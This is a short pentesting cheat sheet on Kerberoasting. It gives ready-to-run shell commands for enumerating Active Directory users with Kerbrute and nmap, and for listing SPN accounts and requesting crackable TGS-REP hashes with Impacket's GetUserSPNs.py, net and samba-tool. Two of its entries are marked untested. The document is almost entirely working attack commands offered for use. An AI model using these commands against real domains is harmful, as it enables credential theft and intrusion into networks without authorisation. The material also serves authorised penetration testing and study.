# Unix Shell

Search Tag(s): #kerberoasting

## 01 - Enumerate Users

### 1.1 - Kerbrute

Enumerate users against the active directory.

```
$ kerbrute userenum [--dc <IP>] -d <domain> users.lst [-t 64]
```

### 1.2 - Network Mapper

```
$ nmap -p 88 -Pn --script=krb5-enum-users --script-args krb5-enum-users.realm="<domain>",userdb=users.lst <IP>
```

## 02 - Enumerate SPN accounts

### 2.1 - `net`

TODO: Test it

```
$ net ads setspn setspn list [machine] -U "[<domain>/]<username>%<password>" -S <IP>

$ net ads setspn setspn list [machine] -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> -S <IP>
```

### 2.2 - Impacket

Request a Kerberos 5 TGS-REP etype 23 hash from an SPN user account.

```
$ GetUserSPNs.py -request -dc-ip <IP> <domain>/<username>:"<password>"

$ GetUserSPNs.py -request -dc-ip <IP> <domain>/<username> -hashes :<nt_hash>

$ GetUserSPNs.py -request -dc-ip <IP> <domain> -usersfile users.lst
```

### 2.3 - `samba-tool`

TODO: Test it

```
$ samba-tool spn list
```

---
## References

- [Impacket](https://github.com/fortra/impacket)

- [Kerbrute](https://github.com/ropnop/kerbrute)

- [Hacking Articles: Abusing Kerberos Using Impacket](https://www.hackingarticles.in/abusing-kerberos-using-impacket/)

- [Certcube: Kerberoasting Common Tools](https://blog.certcube.com/kerberoasting-common-tools/)

- [Pentesting Kerberos 88](https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88)